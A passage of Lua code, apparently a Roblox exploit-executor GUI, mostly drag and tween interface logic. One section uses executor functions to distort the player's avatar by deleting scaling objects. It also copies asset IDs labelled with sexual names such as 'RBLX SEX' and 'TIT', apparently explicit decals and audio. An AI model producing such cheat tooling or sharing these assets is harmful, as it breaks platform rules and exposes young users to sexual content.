		script.Parent.Buttons.Mini,
		script.Parent.Buttons.Close
	}
	for i,c in pairs(script.Parent.Buttons:GetChildren()) do
		coroutine.resume(coroutine.create(function()
			c.Size = UDim2.new(0, 15, 0, 0)
			c.UICorner.CornerRadius = UDim.new(1, 0)
		end))
	end
end
coroutine.wrap(IMBLM_fake_script)()
local function XVZY_fake_script() -- UIList.Dragify 
	local script = Instance.new('LocalScript', UIList)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.135, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
		game:GetService("RunService").Heartbeat:Connect(function()
			if dragToggle == false then
				game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Rotation = 0}):Play()
			end
			if dragToggle == true then
				game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Rotation = 5}):Play()
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(XVZY_fake_script)()
local function MRIKQX_fake_script() -- Top_2.Client 
	local script = Instance.new('LocalScript', Top_2)

	--rconsoleprint('WELCOME, PLEASE DO NOT CLOSE THIS CONSOLE')
	local decals = {11789863504,11854960779,11789349008,9305376600,11361519486,11261278608,11270664671,11580036017}
	local aud = {6770303644,6970996018}
	function tall()
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local Character = LocalPlayer.Character
		local Humanoid = Character:FindFirstChildOfClass("Humanoid")

		local function rm()
			for i,v in pairs(Character:GetDescendants()) do
				if v:IsA("BasePart") then
					if v.Name == "Handle" or v.Name == "Head" then
						if Character.Head:FindFirstChild("OriginalSize") then
							Character.Head.OriginalSize:Destroy()
						end
					else
						for i,cav in pairs(v:GetDescendants()) do
							if cav:IsA("Attachment") then
								if cav:FindFirstChild("OriginalPosition") then
									cav.OriginalPosition:Destroy()  
								end
							end
						end
						v:FindFirstChild("OriginalSize"):Destroy()
						if v:FindFirstChild("AvatarPartScaleType") then
							v:FindFirstChild("AvatarPartScaleType"):Destroy()
						end
					end
				end
			end
		end

		rm()
		wait(0.5)
		Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
		wait(1)

		rm()
		wait(0.5)
		Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
		wait(1)

		rm()
		wait(0.5)
		Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
		wait(1)

		rm()
		wait(0.5)
		Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
		wait(1)

		rm()
		wait(0.5)
		Humanoid:FindFirstChild("HeadScale"):Destroy()
		wait(1)
	end
	function copy()
		return decals[math.random(1, #decals)]
	end
	function copy2()
		return aud[math.random(1, #aud)]
	end
	coroutine.resume(coroutine.create(function()
		local Last = script.Parent.Parent.Parent.UITabs.Tab.FakeChat
		script.Parent.Parent.Box.Text.FocusLost:Connect(function(enter)
			if enter == true and #script.Parent.Parent.Box.Text.Text > 1 then
				if string.lower(script.Parent.Parent.Box.Text.Text) == "tall" then
					tall()
				elseif string.lower(script.Parent.Parent.Box.Text.Text) == "rbd" then
					local c = copy()
					copytoclipboard(c)
					if c == 11789863504  then
						rconsoleprint('COPIED: ' .. 'TIT')
					elseif c == 11854960779 then
						rconsoleprint('COPIED: ' .. 'RBLX SEX')
					elseif c == 11789349008 then
						rconsoleprint('COPIED: ' .. 'HNT0')
					elseif c == 9305376600 then
						rconsoleprint('COPIED: ' .. 'HNT1')
					elseif c == 11361519486 then
						rconsoleprint('COPIED: ' .. 'KTN')
					elseif c == 11261278608 then
						rconsoleprint('COPIED: ' .. 'PNK')
					elseif c == 11270664671 then
						rconsoleprint('COPIED: ' .. 'BLU')
					elseif c == 11580036017 then
						rconsoleprint('COPIED: ' .. 'GOR')
					end
				elseif string.lower(script.Parent.Parent.Box.Text.Text) == "rba" then
					local c = copy2()
					copytoclipboard(c)
					if c == 6770303644  then
						rconsoleprint('COPIED: ' .. 'MPH')
					elseif c == 6970996018 then
						rconsoleprint('COPIED: ' .. 'CRN')
					end
				else
					pcall(function()
						for i,v in pairs(script.Parent.Parent.Parent.UITabs.Tab:GetChildren()) do
							if string.lower(v.Name) == string.lower(script.Parent.Parent.Box.Text.Text) then
								local tab = v
								Last.Visible = false
								tab.Visible = true
								Last = tab
							end
						end
					end)
				end
			end
		end)
	end))
end
coroutine.wrap(MRIKQX_fake_script)()
local function HYLLDBZ_fake_script() -- Box.MSE 
	local script = Instance.new('LocalScript', Box)

	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(1, 0)
		}):Play()
	end)
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Border.UICorner, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			CornerRadius = UDim.new(0, 5)
		}):Play()
	end)
end
coroutine.wrap(HYLLDBZ_fake_script)()
local function UZRJYD_fake_script() -- Text_6.Client 
	local script = Instance.new('LocalScript', Text_6)

	script.Parent.Focused:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = false
		script.Parent.Size = UDim2.new(0, 0, 1, 0)
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(1, 0, 1, 0),
			TextTransparency = 0,
			PlaceholderColor3 = Color3.fromRGB(195, 195, 195),
			TextColor3 = Color3.fromRGB(195, 195, 195)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.2
		}):Play()
	end)
	script.Parent.FocusLost:Connect(function()
		game:GetService("UserInputService").MouseIconEnabled = true
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(0, 0, 1, 0),
			TextTransparency = 1,
			PlaceholderColor3 = Color3.fromRGB(152, 152, 152),
			TextColor3 = Color3.fromRGB(152, 152, 152)
		}):Play()
		game:GetService("TweenService"):Create(script.Parent.Parent.Border, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0.7
		}):Play()
		wait(1)
		script.Parent.Size = UDim2.new(1, 0, 1, 0)
	end)
end
coroutine.wrap(UZRJYD_fake_script)()
